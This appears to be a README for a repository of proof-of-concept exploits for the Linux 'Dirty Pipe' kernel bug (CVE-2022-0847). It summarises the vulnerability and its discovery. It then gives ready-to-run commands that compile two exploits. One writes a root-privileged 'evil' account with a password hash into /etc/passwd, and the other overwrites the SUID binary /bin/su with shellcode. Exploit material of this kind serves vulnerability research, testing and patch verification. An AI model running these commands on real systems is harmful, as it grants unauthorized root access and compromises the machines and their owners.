# Dirty-Pipe-CVE-2022-0847-POCs
- Author: Max Kellermann max.kellermann@ionos.com
- Contributor: Bl4sty https://twitter.com/bl4sty
A new Linux vulnerability known as 'Dirty Pipe' allows local users to gain root privileges through publicly available exploits.

Today, security researcher Max Kellermann responsibly disclosed the 'Dirty Pipe' vulnerability and stated that it affects Linux Kernel 5.8 and later versions, even on Android devices.

The vulnerability is tracked as CVE-2022-0847 and allows a non-privileged user to inject and overwrite data in read-only files, including SUID processes that run as root.

Kellerman discovered the bug after tracking down a bug that was corrupting web server access logs for one of his customers.

Then Bl4sty wrote another version. Instead of overwriting a file like /etc/passwd, it overwrites a user-specified SUID binary (like /bin/su), injecting shellcode that is then executed with privileged user (i.e. root) permissions.

## Exploit 1
```bash
┌──(ghost㉿uchiha)-[~]
└─$gcc PoC1.c -o exploit1 
┌──(ghost㉿uchiha)-[~]
└─$./exploit1 /etc/passwd 189 'evil:$6$USR$aNQSBWd3Bdn4Eo8ZaAjBBXW7M3CM7NnW3vX0Ulrei18dDifAiS0pB2iqCxVCK0nCKfRjdCSqgKHagkul6JEHT/:0:0::/root:/bin/bash
'
```
## Exploit 2
```bash
┌──(ghost㉿uchiha)-[~]
└─$gcc PoC2.c -o exploit2
┌──(ghost㉿uchiha)-[~]
└─$./exploit2 /bin/su
```
For detailed use refer: https://medium.com/@ajithcrajendran/cve-2022-0847-dirty-pipe-a5d68f422dcf
